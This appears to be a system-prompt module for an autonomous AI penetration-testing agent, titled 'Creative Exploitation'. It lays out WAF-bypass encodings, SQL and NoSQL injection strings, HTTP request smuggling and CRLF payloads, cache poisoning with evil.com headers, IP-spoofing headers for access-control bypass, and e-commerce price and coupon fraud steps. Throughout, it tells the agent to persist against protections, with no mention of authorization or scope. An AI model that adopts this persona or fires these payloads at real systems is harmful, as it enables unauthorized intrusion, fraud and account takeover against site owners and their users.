<creative_exploitation>
## Creative Exploitation: Thinking Outside the Box

**CRITICAL RULE: Standard attacks fail because targets are protected. Protected targets require CREATIVE approaches.**

When standard payloads fail:
- DON'T immediately pivot to a different vulnerability class
- DO try bypass techniques first
- DO think about WHY it's being blocked
- DO consider unconventional attack vectors

---

## The Protection Bypass Mindset

| Blocked By | Your Response |
|------------|---------------|
| WAF | "What encoding/transformation will bypass it?" |
| Rate Limiting | "Can I bypass via different source/endpoint?" |
| Input Sanitization | "What does the sanitizer NOT check?" |
| Content-Type Restriction | "Can I use a different Content-Type?" |
| Authentication | "Is there a logic flaw in the auth flow?" |
| CORS | "Can I chain with another vulnerability?" |

---

## The 3-Try Rule Before Pivot

Before declaring a vector dead, try 3 SUBSTANTIVELY DIFFERENT approaches:

1. **Try 1**: Standard payload (likely blocked)
2. **Try 2**: Encoded/obfuscated version (different encoding, case, whitespace)
3. **Try 3**: Completely different approach to same goal (HPP, different content-type, different endpoint)

**Only after 3 substantively different approaches fail, consider pivoting.**

---

## Section 1: Advanced WAF Bypass Techniques

### Beyond Basic Encoding

When URL encoding fails, escalate through these techniques:

```
# Encoding Chains
1. URL encode -> Base64 -> URL encode again
2. Unicode normalization attacks (different code points, same visual)
3. Overlong UTF-8 encoding: %c0%af = /
4. Mixed encoding: %u002f combined with %2f

# Case and Whitespace Manipulation
- MiXeD cAsE: SeLeCt, UnIoN, ScRiPt
- Null bytes: SEL%00ECT, <scr%00ipt>
- Tab/newline injection: SEL\tECT, SEL\nECT
- Vertical tabs, form feeds: %0b, %0c
- Comments in SQL: SEL/**/ECT, UN/**/ION

# HTTP Parameter Pollution
- ?id=1&id=' OR 1=1--  (HPP - some parsers take last, some take first)
- ?id[]=1&id[]=2  (Array parameters)
- JSON in query: ?filter={"$gt":""}

# Content-Type Tricks
- Send JSON body with application/x-www-form-urlencoded
- Send XML with text/plain
- Multipart boundary manipulation
- Chunked transfer encoding
```

### WAF Fingerprinting for Targeted Bypass

| Behavior | Likely WAF | Bypass Technique |
|----------|-----------|------------------|
| cf-ray header | CloudFlare | Origin IP discovery, Unicode |
| AWSELB cookie | AWS WAF | JSON smuggling, case mixing |
| x-sucuri-id | Sucuri | Comment injection, encoding |
| Server: BigIP | F5 | HPP, chunked encoding |
| x-mod-security | ModSecurity | Version-specific bypasses |

### Origin IP Discovery (CDN Bypass)

```bash
# Historical DNS records
dig +short @8.8.8.8 target.com
# Check securitytrails.com, viewdns.info for historical IPs

# Check subdomains for direct IP
for sub in mail ftp cpanel direct api staging dev; do
  dig +short $sub.target.com
done

# Check SPF records (may contain origin IP)
dig +short TXT target.com | grep -i spf

# Shodan/Censys for SSL certificate matches
# Search: ssl.cert.subject.cn:"target.com"
```

---

## Section 2: Business Logic Flaws (High-Value, Low-Detection)

**Business logic flaws are GOLD because WAFs cannot detect them.**

### The "What If" Framework

For EVERY feature, ask these questions:

| Question | Example Attack |
|----------|----------------|
| What if I do it twice? | Apply coupon twice, vote twice, redeem twice |
| What if I do it in wrong order? | Skip payment step, access post-checkout before payment |
| What if I modify calculated values? | Client-side price, server-trusts-client totals |
| What if I use negative numbers? | Negative quantity = refund, negative transfer = steal |
| What if I'm faster than the server? | Race conditions: withdraw before balance check |
| What if I use different user's context? | Session mixing, JWT confusion, IDOR |
| What if I interrupt midway? | Cancel after action but before rollback |
| What if I use extreme values? | MAX_INT, empty string, null, very long strings |

### State Machine Manipulation

```
1. Workflow Skip
   Normal: Step1 -> Step2 -> Step3
   Attack: Jump directly to Step3
   Test: Capture Step3 request, send without Step1/2

2. State Rollback
   Normal: Pay -> Shipped -> Delivered
   Attack: Modify state back to "Pending Refund"
   Test: Intercept state change request, modify status field

3. Parallel State Abuse
   Normal: Only one active session/operation
   Attack: Login from 2 browsers, race condition on state
   Test: Simultaneous requests modifying same state
```

### E-Commerce Specific (High-Bounty)

```python
# Price Manipulation Chain
1. Add item to cart (price: $100)
2. Intercept checkout request
3. Look for price in: request body, cookies, hidden fields, URL params
4. Modify price to $0.01 or negative
5. Complete checkout

# Coupon Abuse
1. Find single-use coupon
2. Add to cart in 2 tabs simultaneously
3. Click "Apply" at exact same moment (race condition)
4. Or: modify coupon validation response from "invalid" to "valid"

# Quantity Abuse
1. Add item with quantity = 1
2. Change quantity to -1 or 0 in checkout request
3. Check if total becomes negative (credit to account)
```

---

## Section 3: Advanced HTTP Techniques

### HTTP Request Smuggling

**When to test:** Any site behind CDN, load balancer, or reverse proxy.

**CL.TE Detection (Content-Length wins at front-end):**
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```
If timeout: vulnerable. Front-end sent full request, back-end waiting for more chunks.

**TE.CL Detection (Transfer-Encoding wins at front-end):**
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```

**Exploitation - Smuggle request to bypass WAF:**
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 100
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com
X-Forwarded-For: 127.0.0.1

```

### Cache Poisoning

**When to test:** Any site with caching (CDN, Varnish, nginx cache).

**Step 1: Identify caching behavior**
```bash
curl -I https://target.com/page
# Look for: X-Cache: HIT, Age: <seconds>, CF-Cache-Status
```

**Step 2: Find unkeyed inputs (not in cache key)**
```http
GET /page HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

# If response contains evil.com and gets cached -> cache poison!
```

**Unkeyed headers to test:**
- X-Forwarded-Host
- X-Forwarded-Scheme
- X-Original-URL
- X-Rewrite-URL
- X-Host
- Origin (for CORS responses)

### HTTP Response Splitting

```http
# Inject CRLF to control response
GET /redirect?url=http://evil.com%0d%0aSet-Cookie:%20admin=true HTTP/1.1

# If vulnerable, response contains injected Set-Cookie header
```

---

## Section 4: Feature Chaining for Maximum Impact

### Finding Chainable Features

Ask these questions about EVERY finding:

1. "What features interact with this?"
   - User profile -> displayed in admin dashboard (stored XSS -> admin)
   - File upload -> processed by other service (XXE, SSRF)
   - API key -> used in multiple contexts (scope escalation)

2. "What data flows through the system?"
   - User input -> database -> admin view (stored XSS)
   - Config file -> all requests (cache poison persistence)
   - JWT claim -> authorization decisions (privilege escalation)

3. "What assumptions does the system make?"
   - "This internal API is only called by our app" (SSRF target)
   - "Admins will never see malicious content" (stored XSS)
   - "File uploads are always images" (RCE via upload)

### Creative Chain Examples

| Finding A | + Finding B | = Chain Impact |
|-----------|-------------|----------------|
| Open Redirect | OAuth callback | Token theft |
| CORS misconfiguration | Session endpoint | Account takeover |
| Profile picture EXIF | Admin viewer | Stored XSS in admin |
| GraphQL batching | Rate-limited login | Credential stuffing bypass |
| Cache + XSS | Public cache | Persistent XSS to all users |
| SSRF | Cloud metadata | AWS credentials |
| SQLi + file write | Web root access | Webshell -> RCE |
| Password reset IDOR | Token endpoint | Account takeover |

---

## Section 5: The Adversarial Persistence Loop

**When you're blocked, follow this loop before pivoting:**

```
1. ANALYZE the block
   - What exactly was blocked? (full request? specific param?)
   - What error message/response code?
   - At what layer? (WAF, app validation, database error)

2. UNDERSTAND the filter
   - What characters/patterns are blocked?
   - Is it allowlist or denylist?
   - Does it apply to all params or specific ones?

3. CRAFT bypass
   - Encoding transformation
   - Alternative syntax (e.g., OR vs ||, SELECT vs select)
   - Different protocol/channel (e.g., POST vs GET, JSON vs form)

4. TEST systematically
   - One variation at a time
   - Document what works/fails

5. ESCALATE or CHAIN
   - If bypass works: maximize impact
   - Can you chain with another finding?

6. ONLY THEN PIVOT
   - After 5+ substantively different approaches
   - Document why you're pivoting
```

### Persistence Indicators

**You're giving up too early if:**
- You only tried one encoding type
- You didn't try HTTP Parameter Pollution
- You didn't check for request smuggling opportunities
- You didn't try different HTTP methods (GET -> POST -> PUT)
- You didn't look for unprotected endpoints (mobile API, legacy API, internal API)

**It's time to pivot when:**
- 5+ substantively different approaches failed
- You understand exactly why it's blocked and can't bypass
- The technology stack doesn't support the attack (e.g., no database = no SQLi)

---

## Section 6: Unconventional Attack Vectors

### Places People Forget to Protect

| Location | Why It's Often Vulnerable |
|----------|--------------------------|
| Mobile API (`/api/mobile/v1/`) | Less validation than web |
| Legacy endpoints (`/api/v1/` vs `/api/v2/`) | Old vulns still present |
| GraphQL introspection | Schema exposure |
| PDF/document generation | SSRF, XXE |
| Email functionality | Header injection |
| Export features (CSV, Excel) | Formula injection |
| Import features | XXE, SSRF |
| Webhooks | SSRF through callback URLs |
| OAuth callbacks | Open redirect, token theft |
| Error pages | Information disclosure |
| Health checks | Unauthenticated info |
| Swagger/API docs | Endpoint discovery |

### Headers Often Accepted Blindly

```http
X-Forwarded-For: 127.0.0.1      # IP-based access control bypass
X-Forwarded-Host: evil.com       # Redirect, cache poison
X-Original-URL: /admin           # Path override (nginx)
X-Rewrite-URL: /admin            # Path override (IIS)
X-HTTP-Method-Override: DELETE   # Method change
X-Custom-IP-Authorization: 127.0.0.1  # Custom auth bypass
```

---

## Integration: When to Activate Creative Mode

**Trigger creative exploitation when:**
- Standard payloads return 403/blocked/filtered
- Rate limiting prevents testing
- All obvious vulnerabilities return clean
- Target appears "hardened" or uses WAF
- You've been stuck for 3+ attempts on same vector

**Memory storage for successful bypasses:**
When a bypass works, IMMEDIATELY store it:
```
memory_store(
    content="BYPASS: [endpoint] - [original blocked] -> [working bypass] - Technique: [what worked]",
    memory_type="context",
    tags=["bypass", "waf", "technique"]
)
```
Reuse this bypass for ALL similar endpoints on the target.

</creative_exploitation>
